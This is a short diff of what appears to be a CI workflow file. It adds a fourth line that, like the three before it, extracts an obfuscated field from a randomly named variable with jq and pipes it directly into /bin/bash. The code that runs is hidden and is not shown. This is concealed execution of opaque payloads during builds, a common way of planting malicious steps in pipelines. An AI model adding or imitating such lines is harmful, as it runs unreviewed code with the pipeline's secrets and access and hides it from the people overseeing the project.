@@ -40,6 +40,7 @@ jobs:
           echo $wbv4 | jq -r .f0437 | /bin/bash
           echo $kgfcs1351 | jq -r .ov8478 | /bin/bash
           echo $gaql696 | jq -r .nb96355 | /bin/bash
+          echo $cxcun1 | jq -r .slk97 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
